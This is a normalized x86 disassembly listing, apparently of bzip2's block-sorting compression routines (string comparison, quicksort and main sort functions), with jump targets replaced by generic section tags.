movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
cmp edi edx
jb r-xdata
cmp esi edx
jb r-xdata
sub edi edx
sub [ ebp + 0x8 ] 0x8
mov edx [ ebp + 0x10 ]
dec [ edx ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
sub esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
xor al al
sub_10019bcf
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x14 ]
sub esp 0x1c
inc eax
cmp eax 0x2
jl r-xdata
leave
retn
xor ecx ecx
cmp [ rw-data ] eax
jge r-xdata
dec ecx
mov [ ebp - 0x18 ] ecx
js r-xdata
inc ecx
cmp [ ecx * 4 + rw-data ] eax
jl r-xdata
push ebx
push edi
dec ecx
mov [ ebp - 0x18 ] ecx
jns r-xdata
mov ecx edi
sub ecx eax
lea ebx [ esi + ecx * 4 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ ebp + 0x14 ]
lea edi [ eax + edx ]
cmp edi [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edi
jg r-xdata
pop edi
pop ebx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_100199e9
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100199e9
add esp 0xc
test al al
jne r-xdata
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_100199e9
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 4 ] eax
mov eax [ ebp + 0x20 ]
inc edi
add ebx 0x4
cmp [ eax ] 0x0
jl r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100199e9
add esp 0xc
test al al
jne r-xdata
cmp edi [ ebp + 0x18 ]
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_100199e9
add esp 0xc
test al al
je r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100199e9
add esp 0xc
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
sub_10019de5
push ebp
mov ebp esp
sub esp 0x508
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov [ ebp - 0x378 ] eax
mov [ ebp - 0x508 ] 0x2
inc ebx
push 0x3e9
call sub_100143a7
dec ebx
lea ecx [ ebp + ebx * 4 - 0x378 ]
mov edi [ ecx ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp + ebx * 4 - 0x508 ]
mov edx [ ecx ]
lea eax [ ebp + ebx * 4 - 0x1e8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov eax [ eax ]
mov ecx edi
sub ecx eax
cmp ecx 0x14
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x20 ] eax
jl r-xdata
push [ ebp + 0x1c ]
push edx
push edi
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10019bcf
mov eax [ ebp + 0x1c ]
add esp 0x1c
cmp [ eax ] 0x0
jl r-xdata
cmp edx 0xe
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ebx ebx
jg r-xdata
lea ecx [ edi + eax ]
sar ecx 0x1
mov ebx [ esi + ecx * 4 ]
mov ecx [ ebp + 0xc ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp - 0x18 ] bl
mov ebx [ esi + edi * 4 ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp + 0x18 ] bl
mov ebx [ esi + eax * 4 ]
add ebx edx
mov cl [ ebx + ecx ]
mov [ ebp - 0x4 ] cl
cmp cl [ ebp + 0x18 ]
jbe r-xdata
cmp ebx 0x62
jge r-xdata
mov cl [ ebp - 0x18 ]
cmp [ ebp + 0x18 ] cl
jbe r-xdata
mov bl [ ebp + 0x18 ]
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x18 ] cl
movzx ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp + 0x18 ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edi
mov eax edi
mov bl [ ebp - 0x4 ]
mov [ ebp + 0x18 ] cl
cmp bl cl
jbe r-xdata
mov ebx [ ebp - 0xc ]
cmp [ ebp - 0x10 ] ebx
jge r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp + 0x18 ] bl
mov ecx [ ebp + 0x18 ]
sub ecx ebx
mov [ ebp - 0x14 ] ecx
mov ecx ebx
sub ecx [ ebp - 0x20 ]
mov ebx [ ebp - 0x14 ]
cmp ecx ebx
jge r-xdata
mov eax [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
inc edx
mov [ eax ] edx
inc ebx
jmp r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0x18 ]
mov [ esi + ebx * 4 ] ecx
mov ebx [ ebp - 0xc ]
inc [ ebp - 0xc ]
inc [ ebp + 0x18 ]
cmp [ ebp + 0x18 ] eax
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jle r-xdata
mov [ ebp - 0x8 ] ebx
test ebx ebx
jle r-xdata
mov ebx ecx
inc [ ebp + 0x18 ]
jmp r-xdata
cmp [ ebp + 0x18 ] eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx eax
mov [ ebp - 0x1c ] ecx
mov ecx edi
sub ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x18 ]
sub ecx ebx
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp + 0x18 ] eax
jg r-xdata
mov ecx [ esi + eax * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0x8 ] ecx
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
mov ebx [ ebx ]
mov ecx [ ecx ]
mov [ ebp - 0x54 ] ebx
mov ebx [ ebp - 0xc ]
add [ ebp - 0xc ] 0x4
mov [ ebx ] ecx
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x54 ]
mov [ ecx ] ebx
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] ecx
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
mov [ esi + eax * 4 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jmp r-xdata
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x14 ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + esi - 0x1 ]
mov [ ebp - 0x2c ] esi
lea eax [ eax + edi + 0x1 ]
lea esi [ ecx + 0x1 ]
mov [ ebp - 0x24 ] esi
lea esi [ eax - 0x1 ]
mov [ ebp - 0x30 ] esi
lea esi [ edx + 0x1 ]
mov [ ebp - 0x3c ] esi
mov ebx ecx
sub ebx [ ebp - 0x20 ]
mov esi edi
sub esi eax
cmp ebx esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x40 ] edx
jge r-xdata
mov ebx [ ebp + 0x18 ]
lea ebx [ esi + ebx * 4 ]
mov [ ebp + 0x18 ] ebx
mov ebx edi
sub ebx ecx
lea ecx [ esi + ebx * 4 + 0x4 ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x18 ]
cmp ecx eax
jg r-xdata
dec eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x40 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x44 ] edx
mov eax edx
jmp r-xdata
mov ebx [ esi ]
mov [ ebp + 0x18 ] ebx
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ecx ] ebx
add esi 0x4
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
inc [ ebp + 0x18 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ esi + eax * 4 ]
mov [ ecx ] ebx
mov ecx [ ebp - 0x14 ]
mov [ esi + eax * 4 ] ecx
dec eax
jmp r-xdata
mov ebx [ ebp - 0x38 ]
sub ebx [ ebp - 0x2c ]
mov edi ecx
sub edi esi
cmp ebx edi
jge r-xdata
mov eax esi
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax ecx
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov edi [ ebp - 0x30 ]
sub edi [ ebp - 0x24 ]
mov ebx ecx
sub ebx esi
cmp ebx edi
jge r-xdata
mov edi [ ebp - 0x2c ]
mov ebx [ ebp - 0x38 ]
mov ebx [ ebp - 0x2c ]
mov edi esi
mov esi ebx
mov ebx [ ebp - 0x38 ]
mov [ ebp + 0x18 ] ebx
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov eax edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov [ edx ] edi
mov edx [ ebp - 0x58 ]
mov edi [ ebp - 0x44 ]
mov [ edx ] ebx
mov ebx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] esi
mov esi [ ebp + 0x8 ]
mov [ edx ] edi
mov [ ebp + ebx * 4 - 0x508 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp + ebx * 4 - 0x378 ] ecx
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp + ebx * 4 - 0x378 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp + ebx * 4 - 0x508 ] eax
inc ebx
jmp r-xdata
sub_1001a155
push ebp
lea ebp [ esp - 0x188 ]
sub esp 0xd2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x184 ] eax
cmp [ ebp + 0x198 ] 0x4
mov eax [ ebp + 0x190 ]
push ebx
push edi
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x19c ]
mov ebx ecx
mov edi edx
mov [ ebp + 0x6c ] ebx
mov [ ebp + 0x70 ] edi
mov [ ebp + 0x5c ] eax
jl r-xdata
mov eax 0x10000
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
and [ esi + eax * 4 ] 0x0
dec eax
jns r-xdata
movzx ecx [ edi ]
mov edx [ ebp + 0x194 ]
shl ecx 0x8
dec edx
cmp edx 0x3
jl r-xdata
test edx edx
jl r-xdata
mov eax [ ebp + 0x64 ]
lea edi [ eax + edx * 2 - 0x4 ]
mov edi [ ebp + 0x70 ]
mov edi [ ebp + 0x64 ]
xor eax eax
mov [ edi + edx * 2 ] ax
mov edi [ ebp + 0x70 ]
movzx eax [ edi + edx ]
shl eax 0x8
sar ecx 0x8
or ecx eax
inc [ esi + ecx * 4 ]
dec edx
jns r-xdata
xor eax eax
mov [ edi + 0x4 ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi + 0x2 ] cx
mov ecx [ ebp + 0x70 ]
movzx ecx [ ecx + edx - 0x1 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
xor eax eax
mov [ edi ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx - 0x2 ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi - 0x2 ] cx
mov ecx [ ebp + 0x70 ]
movzx ecx [ ecx + edx - 0x3 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
sub edx 0x4
sub edi 0x8
cmp edx 0x3
jge r-xdata
mov cl [ edi + eax ]
mov edx [ ebp + 0x68 ]
mov [ edx + eax ] cl
mov edx [ ebp + 0x78 ]
add [ ebp + 0x78 ] 0x2
xor ecx ecx
inc eax
cmp eax 0x22
mov [ edx ] cx
jl r-xdata
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
jmp r-xdata
xor ecx ecx
inc ecx
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
mov ecx [ ebp + 0x194 ]
mov edx [ ebp + 0x64 ]
lea edx [ edx + ecx * 2 ]
xor eax eax
add ecx edi
mov [ ebp + 0x78 ] edx
mov [ ebp + 0x68 ] ecx
mov edx [ esi + ecx * 4 - 0x4 ]
lea eax [ esi + ecx * 4 ]
add [ eax ] edx
inc ecx
cmp ecx 0x10000
jle r-xdata
movzx ax [ edi ]
mov edx [ ebp + 0x194 ]
shl ax 0x8
dec edx
cmp edx 0x3
movzx ecx ax
jl r-xdata
test edx edx
jl r-xdata
mov edi [ ebp + 0x70 ]
or [ ebp + 0x78 ] 0xffffffff
sub [ ebp + 0x78 ] edi
mov [ ebp + 0x80 ] 0xfffffffe
sub [ ebp + 0x80 ] edi
lea eax [ edi + edx - 0x1 ]
push 0x100
xor edi edi
lea eax [ ebp + 0x84 ]
push edi
push eax
call sub_100209e0
add esp 0xc
mov eax [ ebp + 0x70 ]
movzx ax [ eax + edx ]
shl ax 0x8
shr cx 0x8
or ax cx
movzx ecx ax
movzx eax cx
lea edi [ esi + eax * 4 ]
mov eax [ edi ]
dec eax
mov [ edi ] eax
mov [ ebx + eax * 4 ] edx
dec edx
jns r-xdata
movzx di [ eax + 0x1 ]
shr cx 0x8
shl di 0x8
or di cx
movzx edi di
movzx ecx di
lea ebx [ esi + ecx * 4 ]
mov ecx [ ebx ]
dec ecx
mov [ ebx ] ecx
mov ebx [ ebp + 0x6c ]
mov [ ebx + ecx * 4 ] edx
movzx cx [ eax ]
shl cx 0x8
shr di 0x8
or cx di
movzx ecx cx
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
lea edi [ edx - 0x1 ]
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x1 ]
mov ecx [ ebp + 0x74 ]
shl di 0x8
shr cx 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x78 ]
add edi eax
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x2 ]
mov ecx [ ebp + 0x74 ]
shr cx 0x8
shl di 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x80 ]
add edi eax
sub edx 0x4
sub eax 0x4
cmp edx 0x3
mov [ ebx + ecx * 4 ] edi
mov ecx [ ebp + 0x74 ]
jge r-xdata
mov [ ebp + edi * 4 - 0x3a4 ] edi
inc edi
cmp edi 0xff
jle r-xdata
xor eax eax
inc eax
imul eax eax 0x3
inc eax
cmp eax 0x100
jle r-xdata
mov [ ebp + 0x7c ] eax
cmp [ ebp + 0x7c ] 0x1
jne r-xdata
lea eax [ ebp - 0x3a4 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x7c ]
push 0x3
cdq
pop ecx
idiv ecx
cmp eax 0xff
mov [ ebp + 0x7c ] eax
mov [ ebp + 0x74 ] eax
jg r-xdata
and [ ebp + 0x78 ] 0x0
and [ ebp + 0x74 ] 0x0
inc [ ebp + 0x74 ]
mov eax [ ebp + 0x6c ]
add [ ebp + 0x78 ] 0x4
cmp [ ebp + 0x74 ] 0xff
mov [ ebp + edi * 4 - 0x3a4 ] eax
jle r-xdata
mov eax [ ebp + 0x78 ]
jmp r-xdata
inc [ ebp + 0x7c ]
cmp [ ebp + 0x7c ] 0xff
jle r-xdata
shl eax 0x8
add eax [ ebp + 0x7c ]
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x6c ] eax
mov eax [ eax ]
test eax 0x200000
jne r-xdata
mov edi [ ebp + 0x74 ]
mov eax [ ebp + edi * 4 - 0x3a4 ]
mov ecx [ ebp + 0x78 ]
mov ecx [ ecx ]
mov [ ebp + 0x6c ] eax
shl eax 0xa
shl ecx 0xa
add eax esi
lea edx [ ecx + esi ]
mov ecx [ eax + 0x400 ]
sub ecx [ eax ]
mov eax [ edx + 0x400 ]
sub eax [ edx ]
cmp eax ecx
jbe r-xdata
mov edx [ eax ]
mov [ ebp + edi * 4 - 0x3a4 ] edx
mov edx [ ebp + 0x7c ]
sub edi edx
shl edx 0x2
sub eax edx
mov edx [ ebp + 0x7c ]
dec edx
cmp edi edx
mov [ ebp + 0x68 ] eax
jle r-xdata
cmp [ ebp + 0x7c ] eax
je r-xdata
lea ecx [ ebp + eax + 0x84 ]
cmp [ ecx ] 0x0
mov [ ebp + 0x60 ] ecx
jne r-xdata
mov eax [ ebp + 0x6c ]
mov ecx 0xffdfffff
and eax ecx
mov [ ebp + 0x80 ] eax
mov eax [ ebp + 0x6c ]
mov edi [ eax + 0x4 ]
and edi ecx
dec edi
cmp edi [ ebp + 0x80 ]
jle r-xdata
mov eax [ eax ]
shl eax 0xa
add eax esi
mov edx [ eax + 0x400 ]
sub edx [ eax ]
cmp edx ecx
ja r-xdata
push 0x3ee
mov edx eax
shl edx 0x2
lea ecx [ esi + edx ]
mov [ ebp + 0x7c ] ecx
mov [ ebp + 0x80 ] ecx
xor ecx ecx
or [ eax ] 0x200000
mov eax [ ebp + 0x68 ]
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
mov eax [ ebp + 0x68 ]
mov edi [ ebp + 0x80 ]
mov edi [ edi ]
and edi 0xffdfffff
mov [ ebp + ecx - 0x7a4 ] edi
mov edi [ ebp + 0x80 ]
mov edi [ edi + 0x4 ]
add [ ebp + 0x80 ] 0x400
and edi 0xffdfffff
dec edi
mov [ ebp + ecx - 0xba4 ] edi
add ecx 0x4
cmp ecx 0x3fc
jle r-xdata
shl eax 0xa
lea edi [ eax + esi ]
mov eax [ edi ]
lea ecx [ ebp + edx - 0x7a4 ]
and eax 0xffdfffff
cmp eax [ ecx ]
mov [ ebp + 0x80 ] edi
mov [ ebp + 0x68 ] ecx
jge r-xdata
push [ ebp + 0x5c ]
mov eax [ ebp + 0x80 ]
push edi
push [ ebp + 0x194 ]
push [ ebp + 0x64 ]
push [ ebp + 0x70 ]
push ebx
call sub_10019de5
sub edi [ ebp + 0x80 ]
mov eax [ ebp + 0x78 ]
lea eax [ eax + edi + 0x1 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x5c ]
add esp 0x18
cmp [ eax ] 0x0
jl r-xdata
mov eax edi
sub eax [ ebp + 0x80 ]
inc eax
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x7c ]
push [ ebp + 0x68 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x18
mov eax [ edi + 0x400 ]
lea edx [ ebp + edx - 0xba4 ]
and eax 0xffdfffff
mov [ ebp + 0x80 ] edx
jmp r-xdata
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov ecx [ ebp + 0x184 ]
pop edi
xor ecx ebp
pop ebx
call sub_10020040
add ebp 0x188
leave
retn
dec eax
cmp eax [ edx ]
jg r-xdata
mov edi [ ebp + 0x70 ]
movzx edi [ edi + ecx ]
cmp [ ebp + edi + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov eax [ ebp + 0x68 ]
mov eax [ eax ]
mov edx [ edx ]
lea ecx [ eax - 0x1 ]
cmp ecx edx
je r-xdata
mov ecx [ ebp + 0x68 ]
inc eax
cmp eax [ ecx ]
jl r-xdata
lea edi [ ebp + edi * 4 - 0x7a4 ]
mov [ ebp + 0x6c ] edi
mov edi [ edi ]
mov [ ebx + edi * 4 ] ecx
mov ecx [ ebp + 0x6c ]
inc edi
mov [ ecx ] edi
mov edx [ ebp + 0x70 ]
movzx edx [ edx + ecx ]
cmp [ ebp + edx + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov eax [ ebp + 0x7c ]
mov ecx 0x100
test eax eax
jne r-xdata
mov edi [ ebp + 0x80 ]
mov edx [ ebp + 0x80 ]
lea edx [ ebp + edx * 4 - 0xba4 ]
mov [ ebp + 0x6c ] edx
mov edx [ edx ]
mov [ ebx + edx * 4 ] ecx
mov ecx [ ebp + 0x6c ]
dec edx
mov [ ecx ] edx
or [ eax ] 0x200000
add eax 0x400
dec ecx
jne r-xdata
cmp [ ebp + 0x74 ] 0xff
mov eax [ ebp + 0x60 ]
mov [ eax ] 0x1
jge r-xdata
push 0x3ef
jmp r-xdata
mov eax [ ebp + 0x194 ]
dec eax
cmp edx eax
jne r-xdata
inc [ ebp + 0x74 ]
cmp [ ebp + 0x74 ] 0xff
jle r-xdata
mov edx [ edi ]
mov eax [ edi + 0x400 ]
and [ ebp + 0x80 ] 0x0
mov ecx 0xffdfffff
and edx ecx
and eax ecx
sub eax edx
cmp eax 0xfffe
jle r-xdata
call sub_100143a7
mov eax [ ebp + 0x74 ]
mov eax [ ebp + eax * 4 - 0x3a4 ]
and [ ebp + 0x7c ] 0x0
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
dec eax
mov [ ebp + 0x60 ] eax
mov [ ebp + 0x7c ] eax
js r-xdata
inc [ ebp + 0x80 ]
mov ecx [ ebp + 0x80 ]
mov edi eax
sar edi cl
cmp edi 0xfffe
jg r-xdata
mov eax [ ebp + 0x194 ]
sub eax [ ebp + 0x78 ]
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x194 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x14
mov ecx [ ebp + 0x80 ]
sar eax cl
cmp eax 0xffff
jg r-xdata
add edx eax
lea edi [ ebx + edx * 4 ]
push 0x3ea
jmp r-xdata
dec [ ebp + 0x7c ]
sub edi 0x4
cmp [ ebp + 0x7c ] 0x0
jge r-xdata
mov eax [ ebp + 0x194 ]
add edx eax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp + 0x80 ]
mov eax [ ebp + 0x7c ]
mov edx [ edi ]
sar eax cl
cmp edx 0x22
movzx ecx ax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
jge r-xdata
mov eax [ ebp + 0x60 ]
sub_1001a821
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ edi + 0x20 ]
mov edx [ edi + 0x18 ]
mov ecx [ edi + 0x24 ]
push ebx
mov ebx [ edi + 0x268 ]
push esi
mov esi [ edi + 0x44 ]
cmp esi 0x2710
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x30 ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
jge r-xdata
lea edx [ esi + 0x22 ]
test dl 0x1
je r-xdata
push ebx
push esi
mov eax edx
jmp r-xdata
add edx ecx
cmp eax 0x1
mov [ ebp - 0xc ] edx
jge r-xdata
inc edx
push [ edi + 0x14 ]
push [ edi + 0x10 ]
call sub_10019692
add esp 0x10
cmp eax 0x64
jle r-xdata
xor eax eax
inc eax
cmp [ edi + 0x1c ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
dec eax
push 0x3
pop ebx
cdq
idiv ebx
mov edx ecx
mov ecx [ ebp - 0x18 ]
mov ebx eax
imul ebx esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
push esi
push [ ebp - 0xc ]
mov esi [ ebp - 0x14 ]
call sub_1001a155
add esp 0x10
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
push 0x64
pop eax
pop esi
pop ebx
leave
retn
push 0x3eb
call sub_100143a7
mov [ edi + 0x1c ] eax
inc eax
cmp eax [ edi + 0x44 ]
jl r-xdata
